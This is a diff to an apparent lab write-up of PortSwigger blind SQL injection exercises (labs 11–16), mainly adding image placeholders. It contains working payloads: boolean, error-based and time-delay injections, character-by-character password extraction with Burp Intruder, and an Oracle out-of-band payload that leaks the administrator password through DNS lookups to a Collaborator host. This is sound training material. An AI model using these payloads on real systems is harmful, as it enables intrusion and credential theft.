@@ -17,6 +17,9 @@ SELECT ... FROM ... WHERE trackingId = '<cookie value>'
 ```
 
 ## Lab 11 — Blind SQL injection with conditional responses
+> **Picture goes here (#1).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `TrackingId=xyz' AND '1'='1`.
+> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/1.png` _then replace this block with_ `![Lab 11 — Blind SQL injection with conditional responses](/images/portswigger-sqli-part-4-blind-sql-injection/1.png)`_._
+
 
 **Difficulty:** Practitioner
 **Database:** MySQL
@@ -57,9 +60,13 @@ TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='a
 - Grep-Match on `Welcome back`; the row with a hit reveals the character.
 - Increment the `SUBSTRING` offset (`1,1` → `2,1` …) for each position.
 
-> **[Screenshot]** Burp Intruder results with the `Welcome back` grep column ticked for exactly one payload.
+> **Picture goes here (#2).** Burp Intruder results with the `Welcome back` grep column ticked for exactly one payload.
+> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/2.png` _then replace this block with_ `![Lab 11 — Blind SQL injection with conditional responses](/images/portswigger-sqli-part-4-blind-sql-injection/2.png)`_._
 
 ## Lab 12 — Blind SQL injection with conditional errors
+> **Picture goes here (#3).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `TrackingId=xyz'                                  -- error`.
+> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/3.png` _then replace this block with_ `![Lab 12 — Blind SQL injection with conditional errors](/images/portswigger-sqli-part-4-blind-sql-injection/3.png)`_._
+
 
 **Difficulty:** Practitioner
 **Database:** Oracle
@@ -101,9 +108,13 @@ TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0
 
 Use Burp Intruder with a simple `a–z0–9` list; the correct character produces HTTP 500, the rest HTTP 200, so the Status column finds it instantly.
 
-> **[Screenshot]** Intruder results sorted by status, showing the single 500 response per position.
+> **Picture goes here (#4).** Intruder results sorted by status, showing the single 500 response per position.
+> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/4.png` _then replace this block with_ `![Lab 12 — Blind SQL injection with conditional errors](/images/portswigger-sqli-part-4-blind-sql-injection/4.png)`_._
 
 ## Lab 13 — Blind SQL injection with time delays
+> **Picture goes here (#5).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `TrackingId=x'||pg_sleep(10)--`.
+> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/5.png` _then replace this block with_ `![Lab 13 — Blind SQL injection with time delays](/images/portswigger-sqli-part-4-blind-sql-injection/5.png)`_._
+
 
 **Difficulty:** Practitioner
 **Database:** PostgreSQL
@@ -119,7 +130,13 @@ The application takes 10 seconds to respond. Time-based blind is the fallback wh
 
 Other databases: MySQL `SLEEP(10)`, Microsoft SQL Server `WAITFOR DELAY '0:0:10'`, Oracle `dbms_pipe.receive_message(('a'),10)`.
 
+> **Picture goes here (#6).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/6.png` _then replace this block with_ `![Lab 13 — Blind SQL injection with time delays](/images/portswigger-sqli-part-4-blind-sql-injection/6.png)`_._
+
 ## Lab 14 — Blind SQL injection with time delays and information retrieval
+> **Picture goes here (#7).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--`.
+> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/7.png` _then replace this block with_ `![Lab 14 — Blind SQL injection with time delays and information retrieval](/images/portswigger-sqli-part-4-blind-sql-injection/7.png)`_._
+
 
 **Difficulty:** Practitioner
 **Database:** PostgreSQL
@@ -155,9 +172,13 @@ In Burp Intruder:
 - Set **Maximum concurrent requests to 1** in the resource pool so timing measurements are not distorted by parallel requests.
 - Watch the "Response received" column: the correct character takes roughly 10,000 ms.
 
-> **[Screenshot]** Intruder results with one row near 10 s in the "Response received" column.
+> **Picture goes here (#8).** Intruder results with one row near 10 s in the "Response received" column.
+> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/8.png` _then replace this block with_ `![Lab 14 — Blind SQL injection with time delays and information retrieval](/images/portswigger-sqli-part-4-blind-sql-injection/8.png)`_._
 
 ## Lab 15 — Blind SQL injection with out-of-band interaction
+> **Picture goes here (#9).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8`.
+> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/9.png` _then replace this block with_ `![Lab 15 — Blind SQL injection with out-of-band interaction](/images/portswigger-sqli-part-4-blind-sql-injection/9.png)`_._
+
 
 **Difficulty:** Practitioner
 **Database:** Oracle
@@ -173,7 +194,13 @@ Replace `BURP-COLLABORATOR-SUBDOMAIN` with a real Collaborator subdomain (in Bur
 
 > **Using Community Edition:** Burp Collaborator needs Professional. You can use a self-hosted OAST server such as `interactsh` (`interactsh-client`) or `canarytokens.org` and substitute its hostname.
 
+> **Picture goes here (#10).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/10.png` _then replace this block with_ `![Lab 15 — Blind SQL injection with out-of-band interaction](/images/portswigger-sqli-part-4-blind-sql-injection/10.png)`_._
+
 ## Lab 16 — Blind SQL injection with out-of-band data exfiltration
+> **Picture goes here (#11).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8`.
+> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/11.png` _then replace this block with_ `![Lab 16 — Blind SQL injection with out-of-band data exfiltration](/images/portswigger-sqli-part-4-blind-sql-injection/11.png)`_._
+
 
 **Difficulty:** Practitioner
 **Database:** Oracle
@@ -187,7 +214,8 @@ TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encodin
 
 The database performs a DNS lookup for `<password>.your-collaborator-domain`. Poll Collaborator; the password appears as the subdomain of the interaction. Log in as administrator.
 
-> **[Screenshot]** Collaborator interaction list where the subdomain contains the exfiltrated password.
+> **Picture goes here (#12).** Collaborator interaction list where the subdomain contains the exfiltrated password.
+> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/12.png` _then replace this block with_ `![Lab 16 — Blind SQL injection with out-of-band data exfiltration](/images/portswigger-sqli-part-4-blind-sql-injection/12.png)`_._
 
 ## Takeaways
 
